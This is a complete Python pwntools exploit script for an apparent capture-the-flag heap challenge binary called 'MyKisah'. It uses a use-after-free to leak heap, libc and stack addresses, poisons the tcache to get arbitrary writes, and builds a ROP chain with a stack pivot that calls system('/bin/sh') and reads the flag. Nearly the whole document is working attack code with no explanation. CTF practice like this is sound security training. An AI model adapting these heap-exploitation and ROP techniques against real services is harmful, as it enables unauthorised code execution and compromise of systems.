#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './MyKisah_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "150"]
host, port = 'localhost', 40003

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
handle SIGALRM nostop noprint pass

# break *edit+54
# break *use+142

# ret at edit
# break *edit+474

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def create(idx, seconds, title, snooze=0x1):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(seconds).encode())
    io.sendlineafter(b':', str(snooze).encode())
    io.sendafter(b':', title)

def use(idx):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, seconds, title, snooze=0x1):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(seconds).encode())
    io.sendlineafter(b':', str(snooze).encode())
    io.sendafter(b':', title)

def check(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def wait(seconds, send=True):
    sleep(seconds)
    if send:
        io.sendline(b'')

def exploit():
    global io
    io = initialize()
    heap = 0x0
    stack = 0x0
    edit_rip = 0x0

    create(0, 2, b'A')
    create(1, 2, b'B')
    use(0)
    use(1)
    wait(2)

    check(1)
    io.recvuntil(b'selama ')
    heap = demangle(int(io.recvuntil(b' detik', drop=True), 10)) - 0x2a0

    create(0, 3, b'A')
    create(0, 6, b'A')
    create(1, 3, b'B')
    create(2, 3, b'C')
    create(3, 3, p64(heap + 0x290))
    use(3)

    io.sendlineafter(b'>', b'3') 
    wait(3, send=False)
    io.sendlineafter(b':', str(0x0).encode())
    io.sendlineafter(b':', str(0x5d1).encode())
    io.sendafter(b':', p64(heap + 0x290))

    use(0)
    wait(3)

    check(0)
    io.recvuntil(b'selama ')
    libc.address = int(io.recvuntil(b' detik', drop=True), 10) - 0x21ace0

    rop = ROP(libc)
    pop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    create(3, 3, p64(libc.sym['environ']))
    use(3)
    io.sendlineafter(b'>', b'4')
    wait(3, send=False)
    io.recvuntil(b'selama ')
    stack = int(io.recvuntil(b' detik', drop=True), 10)
    edit_rip = stack - 0x160 + 0x10
    stack_pivot = heap + 0x870

    create(3, 3, p64(stack_pivot))
    use(3)
    io.sendlineafter(b'>', b'3')
    wait(4, send=False)
    io.sendlineafter(b':', str(pop_rdi).encode())
    io.sendlineafter(b':', str(next(libc.search(b'/bin/sh\x00'))).encode())
    io.sendafter(b':', b'idc')

    create(3, 3, p64(stack_pivot+0x10))
    use(3)
    io.sendlineafter(b'>', b'3')
    wait(3, send=False)
    io.sendlineafter(b':', str(libc.sym['system']).encode())
    io.sendlineafter(b':', str(0x0).encode())
    io.sendafter(b':', b'idc')

    # pause()
    create(3, 3, p64(edit_rip))
    use(3)
    io.sendlineafter(b'>', b'3')
    wait(3, send=False)
    io.sendlineafter(b':', str(pop_rsp).encode())
    io.sendlineafter(b':', str(stack_pivot).encode())
    io.sendafter(b':', b'idc')

    io.sendline(b'cat flag*')

    log.info("heap: %#x", heap)
    log.info("libc base: %#x", libc.address)
    log.info("stack: %#x", stack)
    log.info("edit rip: %#x", edit_rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
